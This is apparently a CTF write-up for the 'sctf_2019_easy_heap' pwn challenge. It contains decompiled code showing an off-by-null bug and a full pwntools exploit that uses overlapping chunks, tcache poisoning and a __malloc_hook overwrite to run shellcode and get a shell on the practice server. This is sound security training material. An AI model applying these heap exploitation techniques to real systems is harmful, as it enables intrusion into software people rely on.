# BUU-sctf_2019_easy_heap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add**

```c
int add()
{
  unsigned int i; // [rsp+Ch] [rbp-14h]
  void *v2; // [rsp+10h] [rbp-10h]
  unsigned __int64 size; // [rsp+18h] [rbp-8h]

  for ( i = 0; heap_array[2 * i + 1]; ++i )
    ;
  if ( i > 0xF )
    return puts("No more space.");
  printf("Size: ");
  size = sub_EE5();
  if ( size > 0x1000 )
    return puts("Invalid size!");
  v2 = malloc(size);
  if ( !v2 )
  {
    perror("Memory allocate failed!");
    exit(-1);
  }
  heap_array[2 * i + 1] = v2;
  heap_array[2 * i] = size;
  ++heap_counter[0];
  return printf("chunk at [%d] Pointer Address %p\n", i, &heap_array[2 * i + 1]);
}
```

**dele**

```c
int sub_10C2()
{
  _DWORD *v0; // rax
  unsigned int v2; // [rsp+Ch] [rbp-4h]

  printf("Index: ");
  v2 = sub_EE5();
  if ( v2 <= 0xF && *((_QWORD *)&heap_array + 2 * v2 + 1) )
  {
    free(*((void **)&heap_array + 2 * v2 + 1));
    *((_QWORD *)&heap_array + 2 * v2 + 1) = 0LL;
    *((_QWORD *)&heap_array + 2 * v2) = 0LL;
    v0 = heap_counter;
    --heap_counter[0];
  }
  else
  {
    LODWORD(v0) = puts("Invalid index.");
  }
  return (int)v0;
}
```

**fill**

```c
int fill()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]

  printf("Index: ");
  v1 = sub_EE5();
  if ( v1 > 0xF || !heap_array[2 * v1 + 1] )
    return puts("Invalid index.");
  printf("Content: ");
  return my_read(heap_array[2 * v1 + 1], heap_array[2 * v1]);
}
```

**vuln**

```c
unsigned __int64 __fastcall sub_E2D(__int64 a1, unsigned __int64 a2)
{
  char buf; // [rsp+13h] [rbp-Dh] BYREF
  int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < a2; ++i )
  {
    if ( read(0, &buf, 1uLL) <= 0 )
    {
      perror("Read failed!\n");
      exit(-1);
    }
    if ( buf == 10 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  if ( i == a2 )			//off-by-null
    *(_BYTE *)(i + a1) = 0;
  return __readfsqword(0x28u) ^ v5;
}
```

在开始使用`mmap`申请了一块内存，并将权限设为`rwx`，还给了地址。由于无法`show`，而远程libc版本为`2.27`。

我们使用`off-by-one`造成`overlapping`，造成`double free`进而使用`tcache poisoning`申请任意地址。

所以我们在`mmap`的chunk中写入`shellcode`，在`__malloc_hook`填入`shellcode`地址，即可get shell。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./sctf_2019_easy_heap'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('node3.buuoj.cn',27539)

elf = ELF(binary,checksec=False)
#libc = ELF('',checksec=False)

def add(size):
	sh.sendlineafter('>> ','1')
	sh.sendlineafter('Size: ',str(size))

def free(idx):
	sh.sendlineafter('>> ','2')
	sh.sendlineafter('Index: ',str(idx))

def fill(idx,content):
	sh.sendlineafter('>> ','3')
	sh.sendlineafter('Index: ',str(idx))
	sh.sendafter('Content: ',str(content))

mmap_base = int(sh.recvuntil('\n')[-14:],16)
leak('mmap base',mmap_base)

add(0x4f8) #0 0x500
add(0x68)  #1 0x70
add(0x4f8) #2 0x500
add(0x68)  #3 0x70

free(0)
payload=b'a'*0x60+p64(0x570)+b'\n'
fill(1,payload)
free(2)

add(0x4f8) # 0 1--->unsorted bin
#gdb.attach(sh)
add(0x68) # 2 get 2==1

free(3) #tcache->3
free(1) #tcache->1->3

free(2)
add(0x68) #1
fill(1,p64(mmap_base)+'\n')  #tcache->1->mmap_chunk 2==1

add(0x68) #2
add(0x68) #3 mmap_chunk
shellcode= asm(shellcraft.sh())
fill(3,'\x90'*0x10+shellcode+'\n')

'''
unsorted bin: 0x4f8
tcache: NULL
'''

add(0x4f8) #4
free(0)
payload=b'a'*0x60+p64(0x570)+b'\n'
fill(1,payload)
free(4)

add(0x68)  #0
free(0)
free(1)
add(0x4f8-0x70) #0

fill(2,'\x30'+'\n')
add(0x68) #1
add(0x68) #4
fill(4,p64(mmap_base+0x10)*3+'\n')

sh.sendlineafter('>> ','1')
sh.sendlineafter('Size: ','666')

sh.interactive()
```

